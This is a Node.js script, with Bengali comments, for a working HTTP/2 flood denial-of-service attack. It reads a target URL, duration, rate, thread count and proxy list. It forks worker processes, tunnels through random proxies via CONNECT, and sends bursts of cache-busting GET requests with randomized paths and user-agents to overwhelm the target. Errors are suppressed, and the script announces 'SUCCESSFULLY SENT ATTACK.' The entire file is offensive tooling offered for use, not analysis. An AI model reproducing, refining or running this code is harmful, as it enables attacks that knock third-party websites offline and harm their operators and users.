const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const axios = require('axios');
const cheerio = require('cheerio'); 
const gradient = require("gradient-string");

// এখানে url মডিউলটি require করার আর দরকার নেই, কারণ URL ক্লাস এখন গ্লোবাল।

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
    console.log(gradient.vice(`[!] node 404.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));
    process.exit();
}

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
} 

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

// --- মেইন ফিক্স: URL মডিউল ছাড়াই নতুন API ব্যবহার ---
const parsedTarget = new URL(args.target);

const sig = [    
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pss_rsae_sha256',
    'rsa_pkcs1_sha256'
];

const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
    "ECDHE-ECDSA-CHACHA20-POLY1305:HIGH:MEDIUM:3DES"
];

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
]; 

const lang_header = ["en-US,en;q=0.9"];
const encoding_header = ["gzip, deflate, br"];
const control_header = ["no-cache", "max-age=0"];

var proxies = readLines(args.proxyFile);

// cluster.isPrimary এখনকার আধুনিক ভার্সনে ব্যবহৃত হয়
if (cluster.isPrimary || cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder);
}

class NetSocket {
    HTTP(options, callback) {
        // নতুন স্টাইলে হোস্ট এবং অ্যাড্রেস সেট
        const payload = "CONNECT " + options.address + " HTTP/1.1\r\nHost: " + options.address + "\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            if (chunk.toString("utf-8").includes("HTTP/1.1 200")) {
                return callback(connection, undefined);
            }
            connection.destroy();
            return callback(undefined, "error");
        });

        connection.on("timeout", () => { connection.destroy(); });
        connection.on("error", () => { connection.destroy(); });
    }
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":"); 

    // headers ফিক্স করা হয়েছে নতুন URL API অনুযায়ী
    headers[":method"] = "GET";
    headers[":authority"] = parsedTarget.hostname;
    // pathname এবং search ব্যবহার করে পূর্ণ পাথ তৈরি
    headers[":path"] = parsedTarget.pathname + (parsedTarget.search || "") + (parsedTarget.search ? "&" : "?") + randstr(5) + "=" + randstr(25);
    headers[":scheme"] = "https";
    headers["accept-language"] = randomElement(lang_header);
    headers["accept-encoding"] = randomElement(encoding_header);
    headers["cache-control"] = randomElement(control_header);
    headers["accept"] = randomElement(accept_header);
    headers["user-agent"] = randstr(15);
    headers["referer"] = "https://" + parsedTarget.hostname + "/";
    headers["origin"] = "https://" + parsedTarget.hostname;

    const proxyOptions = {
        host: parsedProxy[0],
        port: Number(parsedProxy[1]),
        address: parsedTarget.hostname + ":443",
        timeout: 100,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 600000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            sigalgs: randomElement(sig),
            socket: connection,
            ciphers: tls.getCiphers().join(":") + ":" + randomElement(cplist),
            ecdhCurve: "prime256v1:X25519",
            rejectUnauthorized: false,
            servername: parsedTarget.hostname,
            secureProtocol: "TLS_method",
        };

        const tlsConn = tls.connect(443, parsedTarget.hostname, tlsOptions); 

        tlsConn.on("secureConnect", () => {
            // href এর বদলে origin ব্যবহার
            const client = http2.connect(parsedTarget.origin, {
                protocol: "https:",
                createConnection: () => tlsConn,
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 2000,
                    initialWindowSize: 6291456,
                    maxHeaderListSize: 65536,
                    enablePush: false
                }
            });

            client.on("connect", () => {
                const IntervalAttack = setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        const request = client.request(headers).on("response", () => {
                            request.close();
                            request.destroy();
                        });
                        request.end();
                    }
                }, 1000);
                setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
            });

            client.on("close", () => { client.destroy(); connection.destroy(); });
            client.on("error", () => { client.destroy(); connection.destroy(); });
        });
    });
}

console.log(gradient.vice(`[!] SUCCESSFULLY SENT ATTACK.`));
setTimeout(() => process.exit(1), args.time * 1000);
